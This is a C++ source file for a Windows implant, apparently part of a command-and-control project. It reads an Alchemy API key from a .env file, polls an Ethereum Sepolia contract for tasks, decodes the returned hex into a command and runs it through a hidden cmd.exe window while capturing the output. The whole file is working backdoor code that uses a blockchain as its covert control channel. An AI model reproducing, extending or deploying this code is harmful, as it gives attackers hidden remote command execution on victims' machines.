#include "../include/rpcengine.h"
#include "../include/HTTPClient.h"
#include <iostream>
#include <fstream>
#include <string>
#include <algorithm>
#include <cstdint>
#include <vector>
#include <windows.h>

std::string getEnvVar(const std::string& filepath, const std::string& key) {
    std::ifstream file(filepath);
    std::string line;
    std::string searchKey = key + "=";
    while (std::getline(file, line)) {
        if (line.find(searchKey) == 0) { 
            std::string val = line.substr(searchKey.length());
            val.erase(std::remove(val.begin(), val.end(), '\"'), val.end());
            return val;
        }
    }
    return "";
}

// NEW: Robust EVM Memory Decoder
std::string decodeEVMString(const std::string& hexStr) {
    if (hexStr.length() < 66 || hexStr == "0x" || hexStr.find("ERROR") != std::string::npos) {
        return "";
    }
    
    std::string ascii = "";
    // Start at index 2 to skip "0x". Read left-to-right.
    for (size_t i = 2; i < hexStr.length() - 2; i += 2) {
        std::string byteString = hexStr.substr(i, 2);
        // Stop immediately when we hit the EVM zero-padding
        if (byteString == "00") break; 
        
        char byte = (char)strtol(byteString.c_str(), NULL, 16);
        ascii += byte;
    }
    return ascii;
}

// The Execution Engine you built
std::string executeShellCommand(const std::string& command) {
    std::string result = "";
    HANDLE hReadPipe = NULL;
    HANDLE hWritePipe = NULL;
    SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };

    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) return "[-] Failed to create pipe.";
    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    std::string full_command = "cmd.exe /c " + command;
    std::vector<char> cmdBuffer(full_command.begin(), full_command.end());
    cmdBuffer.push_back('\0');

    if(!CreateProcessA(NULL, cmdBuffer.data(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hWritePipe);
        CloseHandle(hReadPipe);
        return "[-] CreateProcessA failed!";
    }

    CloseHandle(hWritePipe);
    char buffer[4096];
    DWORD bytesRead;
    while(ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    CloseHandle(hReadPipe);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    return result;
}

int main() {
    std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;

    std::string apiKey = getEnvVar("../../hub/.env", "ALCHEMY_API_KEY");
    if (apiKey.empty()) {
        std::cout << "[-] FATAL: Could not locate ALCHEMY_API_KEY" << std::endl;
        return 1;
    }

    std::wstring wApiKey(apiKey.begin(), apiKey.end());
    std::string taskRequest = Rpcengine::buildTaskQueryReq();
    std::wstring host = L"eth-sepolia.g.alchemy.com";
    std::wstring path = L"/v2/" + wApiKey;

    std::cout << "[*] Polling Sepolia Hub for tasks..." << std::endl;
    std::string response = HTTPClient::postRequest(host, path, taskRequest);

    // Parse the blockchain response
    std::string rawHex = Rpcengine::extractResults(response);
    
    // Convert EVM Hex to clean ASCII string
    std::string command = decodeEVMString(rawHex);
    std::cout << "Below is the command recieved\n";
    std::cout << command + "\n";

    // The Dynamic Router
    if (command.empty()) {
        std::cout << "[zZz] No active tasks. Standing by." << std::endl;
    } 
    else {
        std::cout << "[!] Target Payload Acquired: " << command << std::endl;
        std::cout << "[*] Handing off to Windows OS..." << std::endl;
        
        std::string output = executeShellCommand(command);
        
        std::cout << "\n================= EXECUTION OUTPUT =================" << std::endl;
        std::cout << output;
        std::cout << "====================================================" << std::endl;
    }

    return 0;
}